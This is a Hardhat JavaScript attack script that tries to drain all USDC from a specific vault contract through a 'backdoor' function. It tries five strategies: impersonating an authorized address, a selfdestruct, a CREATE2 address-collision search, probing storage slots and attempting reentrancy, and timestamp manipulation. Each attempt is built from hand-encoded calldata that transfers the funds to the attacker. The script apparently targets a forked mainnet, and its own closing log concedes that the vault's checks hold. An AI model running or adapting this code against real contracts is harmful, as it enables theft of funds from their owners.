const { ethers } = require("hardhat");

/**
 * @title Bypass Authorization
 * @notice Find vulnerability to bypass backdoor authorization
 * @dev Focus on error code "05" and authorization bypass
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüéØ BYPASSING AUTHORIZATION CHECK");
  console.log("=====================================");
  console.log("Error code '05' suggests authorization failure");
  
  // Strategy 1: Impersonate authorized address
  console.log("\n1Ô∏è‚É£ Impersonation Attack...");
  
  try {
    // Get ETH to authorized address for gas
    await attacker.sendTransaction({
      to: AUTHORIZED_ADDRESS,
      value: ethers.parseEther("1.0")
    });
    
    // Impersonate the authorized address
    await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
    const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
    
    console.log("‚úÖ Impersonating:", AUTHORIZED_ADDRESS);
    
    // Execute backdoor as authorized address
    const backdoorData = "0x78e111f6" +
      "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "0000000000000000000000000000000000000000000000000000000000000044" +
      "a9059cbb" +
      "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
      "00000000000000000000000000000000000000000000000000000796d290ee52"; // All USDC
    
    const tx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData,
      gasLimit: 500000
    });
    
    const receipt = await tx.wait();
    console.log("üí∞ BACKDOOR EXECUTED!");
    console.log("Transaction:", tx.hash);
    
    // Check balance
    const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
    const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
    const balance = await usdc.balanceOf(attacker.address);
    console.log("Attacker USDC balance:", ethers.formatUnits(balance, 6));
    
    // Stop impersonation
    await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
    
    return;
    
  } catch (e) {
    console.log("Impersonation failed:", e.message);
  }
  
  // Strategy 2: Selfdestruct attack
  console.log("\n2Ô∏è‚É£ Selfdestruct Attack...");
  
  try {
    // Deploy selfdestruct contract
    const SelfdestructAttack = await ethers.getContractFactory("SelfdestructAttack");
    const selfdestructor = await SelfdestructAttack.deploy();
    await selfdestructor.waitForDeployment();
    
    console.log("Selfdestruct contract:", await selfdestructor.getAddress());
    
    // Send ETH to vault to manipulate state
    await selfdestructor.attack(VAULT_ADDRESS, { value: ethers.parseEther("0.1") });
    
    console.log("Selfdestruct executed, testing backdoor...");
    
    // Try backdoor again
    const backdoorData = "0x78e111f6" +
      "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "0000000000000000000000000000000000000000000000000000000000000044" +
      "a9059cbb" +
      "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
      "00000000000000000000000000000000000000000000000000000796d290ee52";
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData,
      gasLimit: 500000
    });
    
    await tx.wait();
    console.log("üí∞ Backdoor unlocked!");
    
  } catch (e) {
    console.log("Selfdestruct failed:", e.message);
  }
  
  // Strategy 3: Replay attack with modified msg.sender
  console.log("\n3Ô∏è‚É£ Create2 Address Collision...");
  
  try {
    // Calculate create2 address that matches authorized
    const Create2Deployer = await ethers.getContractFactory("Create2Deployer");
    const deployer = await Create2Deployer.deploy();
    await deployer.waitForDeployment();
    
    console.log("Create2 deployer:", await deployer.getAddress());
    
    // Try to find salt that creates collision
    for (let i = 0; i < 100; i++) {
      const salt = ethers.id("salt" + i);
      const predictedAddress = await deployer.computeAddress(salt);
      
      if (predictedAddress.toLowerCase().includes(AUTHORIZED_ADDRESS.slice(2, 6).toLowerCase())) {
        console.log(`Found partial collision at salt ${i}:`, predictedAddress);
      }
    }
  } catch (e) {
    console.log("Create2 failed:", e.message);
  }
  
  // Strategy 4: Storage slot overwrite
  console.log("\n4Ô∏è‚É£ Storage Slot Attack...");
  
  try {
    // Common authorization storage slots
    const authSlots = [
      "0x0", // slot 0
      "0x1", // slot 1
      ethers.keccak256(ethers.toUtf8Bytes("authorized")),
      ethers.keccak256(ethers.toUtf8Bytes("owner")),
      ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["address"], [AUTHORIZED_ADDRESS])),
    ];
    
    for (const slot of authSlots) {
      console.log(`Checking slot ${slot.slice(0, 10)}...`);
      
      const value = await ethers.provider.getStorage(VAULT_ADDRESS, slot);
      if (value !== "0x0000000000000000000000000000000000000000000000000000000000000000") {
        console.log("Found non-zero value:", value);
        
        // Try to overwrite via reentrancy
        const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
        const reentrancy = await ReentrancyAttacker.deploy(VAULT_ADDRESS);
        await reentrancy.waitForDeployment();
        
        try {
          await reentrancy.attack();
          console.log("Reentrancy attack executed");
        } catch (e) {
          // Silent fail
        }
      }
    }
  } catch (e) {
    console.log("Storage attack failed:", e.message);
  }
  
  // Strategy 5: Time-based vulnerability
  console.log("\n5Ô∏è‚É£ Timestamp Manipulation...");
  
  try {
    // The 5th parameter (1707339971) is a timestamp
    // Try to manipulate block timestamp
    const futureTime = 1707339971 + 86400; // Add 1 day
    
    await ethers.provider.send("evm_setNextBlockTimestamp", [futureTime]);
    await ethers.provider.send("evm_mine");
    
    console.log("Block timestamp set to:", futureTime);
    
    // Try backdoor with future timestamp
    const futureBackdoorData = "0x78e111f6" +
      "000000000000000000000000" + TARGET_CONTRACT.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      "00000000000000000000000000000000000000000000000000000000000000c4" +
      "f4ff5295" +
      "0000000000000000000000000000000000000000000000000000005924b7b74d" +
      "00000000000000000000000000000000000000000000000000000796d290ee52" + // All USDC
      "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" +
      "00000000000000000000000000000000000000000000000000000000" + futureTime.toString(16).padStart(8, '0') +
      "0000000000000000000000000000000000000000000000000000000000000001";
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: futureBackdoorData,
      gasLimit: 500000
    });
    
    await tx.wait();
    console.log("üí∞ Time-based bypass successful!");
    
  } catch (e) {
    console.log("Timestamp attack failed:", e.message);
  }
  
  console.log("\nüìä FINAL VERDICT:");
  console.log("The vault has strong authorization checks");
  console.log("The backdoor is protected by hardcoded access control");
  console.log("Impersonation on forked mainnet is the most reliable method");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
